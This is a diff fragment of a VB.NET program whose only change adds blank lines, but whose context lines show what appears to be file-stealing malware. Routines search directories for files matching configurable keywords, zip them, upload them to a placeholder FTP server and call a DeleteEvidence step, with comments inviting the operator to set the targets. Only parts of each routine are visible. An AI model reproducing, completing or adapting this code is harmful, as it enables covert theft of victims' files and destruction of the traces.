@@ -17,6 +17,7 @@ Module Module1
             DeleteEvidence()
         End If
     End Sub
+    
     Private Function ChosenPath() As String
         Dim localapp, programs, system, name, chosen As String
         Dim size, max As Long
@@ -48,6 +49,7 @@ Module Module1
 
         Return chosen
     End Function
+
     Private Sub DirSearch()
         Dim thisFile As String = Assembly.GetExecutingAssembly.Location()
 
@@ -60,6 +62,7 @@ Module Module1
             End If
         Next
     End Sub
+
     Private Sub Target(ByVal fn As String)
         Dim target() As String = New String() {"cch"} 'Change it by will,and make sure all elements are lowercase
         Dim f As String
@@ -71,6 +74,7 @@ Module Module1
             End If
         Next
     End Sub
+
     Private Sub Research(ByVal sDir As String)
         On Error Resume Next
 
@@ -87,9 +91,11 @@ Module Module1
             End If
         Next
     End Sub
+
     Private Sub ZipThisFile()
         ZipFile.CreateFromDirectory(mypath, zip)
     End Sub
+
     Private Sub Upload()
         Const ftp As String = "Your FTP server here"
         Dim temp, server As String
